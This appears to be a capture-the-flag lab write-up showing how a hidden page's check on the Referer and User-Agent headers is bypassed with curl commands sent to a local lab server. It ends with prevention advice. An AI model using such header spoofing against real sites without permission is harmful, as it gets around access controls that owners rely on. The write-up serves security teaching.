# Header Spoofing (Referer + User-Agent)

## Vulnerability
A hidden page restricts access based on `Referer` and `User-Agent` HTTP headers, which are fully client-controlled.

## Exploitation
1. Find the hidden page URL in the page source (buried among hundreds of blank lines in the copyright link)
2. Source comments reveal:
   - Required Referer: `https://www.nsa.gov/`
   - Required User-Agent: `ft_bornToSec`
3. Send a request with spoofed headers using curl:

```bash
curl -s "http://172.16.60.128/?page=b7e44c7a40c5f80139f0a50f3650fb2851aa0d29" \
  --referer "https://www.nsa.gov/" \
  --user-agent "ft_bornToSec"
```
``` bash
curl -s 'http://localhost:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' | grep -i 'nsa\|bornToSec\|browser\|come from\|referer'
```

4. Server accepts the spoofed headers and returns the flag

## Impact
Any access control based on Referer or User-Agent is trivially bypassable since these are client-controlled headers.

## Prevention
- Never use HTTP headers as an authentication or access control mechanism
- Implement real authentication with server-side sessions or signed tokens
